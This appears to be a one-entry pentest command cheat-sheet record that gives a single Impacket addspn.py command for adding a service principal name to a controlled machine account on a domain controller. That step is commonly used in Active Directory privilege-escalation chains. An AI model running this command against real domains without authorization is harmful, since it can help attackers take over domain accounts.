---
id: 031a3726-3256-438d-8217-b605e530f9dd
name: Add SPN to ControlledComputer
type: command
executor: bash
data: impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$'
  -c DomainController
output: null
created_at: '2023-04-06T03:56:03.096393+00:00'
updated_at: '2023-04-10T20:26:11.555942+00:00'
---

# Add SPN to ControlledComputer

```bash
impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
```


